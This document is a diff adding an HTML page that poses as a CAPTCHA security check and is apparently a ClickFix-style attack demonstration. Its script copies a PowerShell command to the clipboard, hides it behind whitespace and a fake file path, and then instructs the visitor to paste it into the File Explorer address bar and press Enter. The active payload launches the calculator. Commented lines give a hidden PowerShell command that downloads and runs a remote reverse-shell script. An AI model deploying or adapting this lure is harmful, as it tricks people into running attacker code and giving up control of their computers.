@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Security Verification</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f2f2f2;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background-color: white;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      width: 420px;
+      text-align: center;
+    }
+
+    h2 {
+      color: #333;
+    }
+
+    .captcha-box {
+      border: 1px solid #ccc;
+      padding: 20px;
+      margin: 20px 0;
+      border-radius: 8px;
+      background-color: #fafafa;
+    }
+
+    .loading {
+      color: #0078d4;
+      font-size: 14px;
+      margin-top: 15px;
+    }
+
+    .instructions {
+      display: none;
+      margin-top: 20px;
+      text-align: left;
+      font-size: 14px;
+      color: #333;
+    }
+
+    .instructions code {
+      background: #eee;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-family: monospace;
+    }
+
+    button {
+      background-color: #0078d4;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      font-size: 15px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #005fa3;
+    }
+
+    .footer {
+      font-size: 11px;
+      color: #888;
+      margin-top: 30px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>Security Verification Required</h2>
+    <p>To continue, please verify you're a human visitor.</p>
+
+    <div class="captcha-box">
+      <p>Click below to verify</p>
+      <button id="verifyBtn">I’m not a robot</button>
+    </div>
+
+    <div class="loading" id="statusMsg"></div>
+
+    <div class="instructions" id="instructionsBox">
+      <p><strong>To complete verification:</strong></p>
+      <ol>
+        <li>Open <strong>File Explorer</strong> (📁)</li>
+        <li>Press <code>CTRL + L</code> to highlight the address bar</li>
+        <li>Press <code>CTRL + V</code> to paste the verification code</li>
+        <li>Press <code>Enter</code></li>
+      </ol>
+    </div>
+
+    <div class="footer">
+      © 2025 Web Verification Authority
+    </div>
+  </div>
+
+  <script>
+    const verifyBtn = document.getElementById("verifyBtn");
+    const status = document.getElementById("statusMsg");
+    const instructions = document.getElementById("instructionsBox");
+
+    verifyBtn.addEventListener("click", () => {
+      // Step 1: Fake loading
+      status.textContent = "Verifying... please wait.";
+
+      // Step 2: After delay, copy payload and show instructions
+      setTimeout(() => {
+        const realCmd = "powershell.exe -c Start-Process calc.exe";
+        //const firstcmd = "powershell.exe -nop -w hidden -c ";
+		//const secondCmd = "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/rev.ps1')";
+        //const realCmd = "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://127.0.0.1:4444/rev.ps1')";
+        const padding = " ".repeat(200); // Push the real command out of view
+        //const fakePath = "# C:\company\internal-secure\HRPolicy.docx"
+        const fakePath = "# C:\\Users\\Public\\Shared\\VerificationCode.txt";
+
+        navigator.clipboard.writeText(realCmd + padding + fakePath);
+
+        status.textContent = "✔️ Verification code copied to clipboard.";
+        instructions.style.display = "block";
+      }, 2500);
+    });
+  </script>
+
+</body>
+</html>
